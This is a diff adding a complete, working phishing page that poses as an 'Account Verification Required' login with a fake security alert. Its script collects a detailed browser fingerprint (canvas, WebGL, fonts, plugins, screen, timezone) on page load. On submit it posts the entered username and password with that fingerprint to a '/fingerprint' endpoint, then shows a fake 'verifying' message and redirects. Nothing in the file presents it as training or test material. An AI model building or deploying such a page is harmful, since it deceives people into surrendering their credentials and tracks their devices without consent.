@@ -1,0 +1,260 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Account Verification Required</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .container {
+            background: white;
+            padding: 2rem;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            width: 100%;
+            max-width: 400px;
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 2rem;
+        }
+        .logo img {
+            width: 120px;
+            height: auto;
+        }
+        h1 {
+            color: #333;
+            text-align: center;
+            margin-bottom: 1.5rem;
+            font-size: 1.5rem;
+        }
+        .alert {
+            background-color: #fff3cd;
+            border: 1px solid #ffeaa7;
+            color: #856404;
+            padding: 1rem;
+            border-radius: 4px;
+            margin-bottom: 1.5rem;
+        }
+        .form-group {
+            margin-bottom: 1rem;
+        }
+        label {
+            display: block;
+            margin-bottom: 0.5rem;
+            color: #555;
+            font-weight: bold;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 0.75rem;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 1rem;
+            box-sizing: border-box;
+        }
+        input[type="text"]:focus, input[type="password"]:focus {
+            outline: none;
+            border-color: #007bff;
+            box-shadow: 0 0 0 2px rgba(0,123,255,0.25);
+        }
+        .btn {
+            width: 100%;
+            padding: 0.75rem;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        .btn:hover {
+            background-color: #0056b3;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 1.5rem;
+            font-size: 0.875rem;
+            color: #666;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="/static/logo.png" alt="Company Logo" onerror="this.style.display='none'">
+            <h2>Secure Login</h2>
+        </div>
+
+        <h1>Account Verification Required</h1>
+
+        <div class="alert">
+            <strong>Security Alert:</strong> Your account requires immediate verification due to recent suspicious activity. Please log in to confirm your identity.
+        </div>
+
+        <form id="loginForm">
+            <div class="form-group">
+                <label for="username">Username or Email:</label>
+                <input type="text" id="username" name="username" required autocomplete="username">
+            </div>
+
+            <div class="form-group">
+                <label for="password">Password:</label>
+                <input type="password" id="password" name="password" required autocomplete="current-password">
+            </div>
+
+            <button type="submit" class="btn">Verify Account</button>
+        </form>
+
+        <div class="footer">
+            <p>This is a secure verification process. Your information is protected.</p>
+        </div>
+    </div>
+
+    <script>
+        // Browser fingerprinting
+        const fingerprint = {};
+
+        // Basic properties
+        fingerprint.userAgent = navigator.userAgent;
+        fingerprint.language = navigator.language;
+        fingerprint.languages = navigator.languages;
+        fingerprint.platform = navigator.platform;
+        fingerprint.cookieEnabled = navigator.cookieEnabled;
+        fingerprint.doNotTrack = navigator.doNotTrack;
+
+        // Screen properties
+        fingerprint.screenWidth = screen.width;
+        fingerprint.screenHeight = screen.height;
+        fingerprint.screenColorDepth = screen.colorDepth;
+        fingerprint.screenPixelDepth = screen.pixelDepth;
+
+        // Timezone
+        fingerprint.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        fingerprint.timezoneOffset = new Date().getTimezoneOffset();
+
+        // Canvas fingerprinting
+        function getCanvasFingerprint() {
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            ctx.textBaseline = 'top';
+            ctx.font = '14px Arial';
+            ctx.fillText('Browser fingerprinting test', 2, 2);
+            return canvas.toDataURL();
+        }
+        fingerprint.canvas = getCanvasFingerprint();
+
+        // WebGL fingerprinting
+        function getWebGLFingerprint() {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (!gl) return null;
+
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                return {
+                    vendor: gl.getParameter(gl.VENDOR),
+                    renderer: gl.getParameter(gl.RENDERER),
+                    debugVendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : null,
+                    debugRenderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : null
+                };
+            } catch (e) {
+                return null;
+            }
+        }
+        fingerprint.webgl = getWebGLFingerprint();
+
+        // Font detection (basic)
+        function detectFonts() {
+            const fonts = ['Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Verdana', 'Georgia'];
+            const detected = [];
+            const testString = 'mmmmmmmmmmlli';
+            const testSize = '72px';
+
+            fonts.forEach(font => {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                ctx.font = testSize + ' ' + font;
+                const defaultWidth = ctx.measureText(testString).width;
+
+                ctx.font = testSize + ' monospace';
+                const monoWidth = ctx.measureText(testString).width;
+
+                if (defaultWidth !== monoWidth) {
+                    detected.push(font);
+                }
+            });
+
+            return detected;
+        }
+        fingerprint.fonts = detectFonts();
+
+        // Plugins
+        fingerprint.plugins = Array.from(navigator.plugins).map(p => ({
+            name: p.name,
+            description: p.description,
+            filename: p.filename
+        }));
+
+        // Send fingerprint data
+        function sendFingerprint(credentials = null) {
+            const data = {
+                fingerprint: fingerprint,
+                timestamp: new Date().toISOString(),
+                url: window.location.href,
+                referrer: document.referrer,
+                credentials: credentials
+            };
+
+            // Send via fetch to our endpoint
+            fetch('/fingerprint', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data)
+            }).catch(err => console.log('Fingerprint send failed:', err));
+        }
+
+        // Send initial fingerprint on page load
+        window.addEventListener('load', function() {
+            sendFingerprint();
+        });
+
+        // Handle form submission
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            const credentials = {
+                username: username,
+                password: password
+            };
+
+            // Send fingerprint with credentials
+            sendFingerprint(credentials);
+
+            // Show "processing" message
+            const form = document.getElementById('loginForm');
+            form.innerHTML = '<div style="text-align: center; color: #666;"><p>Verifying your account...</p><p>Please wait...</p></div>';
+
+            // Redirect after a delay (to simulate processing)
+            setTimeout(() => {
+                window.location.href = '/verified';
+            }, 2000);
+        });
+    </script>
+</body>
+</html>
